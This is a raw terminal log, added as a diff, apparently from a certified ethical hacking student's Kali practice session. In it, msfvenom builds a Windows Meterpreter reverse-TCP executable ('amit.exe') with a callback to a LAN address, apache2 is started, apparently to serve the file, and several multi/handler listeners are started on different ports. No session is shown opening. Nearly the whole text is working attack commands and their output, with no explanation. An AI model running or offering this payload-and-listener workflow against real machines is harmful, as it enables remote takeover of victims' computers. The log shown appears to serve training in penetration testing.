@@ -1,0 +1,214 @@
+root@kali:~/Desktop/Amit/CEH# cd ~
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.137 LPORT=4455 -f exe -o /root/Desktop/amit.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+Saved as: /root/Desktop/amit.exe
+root@kali:~# service postgresql start
+root@kali:~# msfconsloe -q
+bash: msfconsloe: command not found
+root@kali:~# msfconsle -q
+bash: msfconsle: command not found
+root@kali:~# msfconsole -q
+msf > use exploit/multi/handler 
+msf exploit(multi/handler) > show optios
+[-] Invalid parameter "optios", use "show -h" for more information
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > use options
+^Z
+[1]+  Stopped                 msfconsole -q
+root@kali:~# msfconsloe -q
+bash: msfconsloe: command not found
+root@kali:~# msfconsole -q
+msf > use exploit/multi/handler 
+msf exploit(multi/handler) > et payload windows/meterpreter/reverse_tcp
+[-] Unknown command: et.
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > set LHOST=192.168.0.137
+[-] Unknown variable
+Usage: set [option] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore
+
+msf exploit(multi/handler) > set LHOST 192.168.0.137
+LHOST => 192.168.0.137
+msf exploit(multi/handler) > set LPORT 5566
+LPORT => 5566
+msf exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+
+[*] Started reverse TCP handler on 192.168.0.137:5566 
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:5566
+
+msf exploit(multi/handler) > service apache2 start
+[*] exec: service apache2 start
+
+msf exploit(multi/handler) > set LPORT 4455
+LPORT => 4455
+msf exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 1.
+
+[*] Started reverse TCP handler on 192.168.0.137:4455 
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:5566
+  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:4455
+
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:5566
+  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:4455
+
+msf exploit(multi/handler) > sessions 
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > kill 0-
+[-] Please specify valid job identifier(s)
+msf exploit(multi/handler) > kill 0
+[*] Stopping the following job(s): 0
+[*] Stopping job 0
+msf exploit(multi/handler) > sessions 
+
+Active sessions
+===============
+
+No active sessions.
+
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:4455
+
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:4455
+
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:4455
+
+msf exploit(multi/handler) > jobs -K
+]Stopping all jobs...
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.137    yes       The listen address (an interface may be specified)
+   LPORT     4455             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > set LPORT 44556
+LPORT => 44556
+msf exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 2.
+
+[*] Started reverse TCP handler on 192.168.0.137:44556 
+msf exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                          Payload opts
+  --  ----                    -------                          ------------
+  2   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.0.137:44556
+
+msf exploit(multi/handler) > 
+
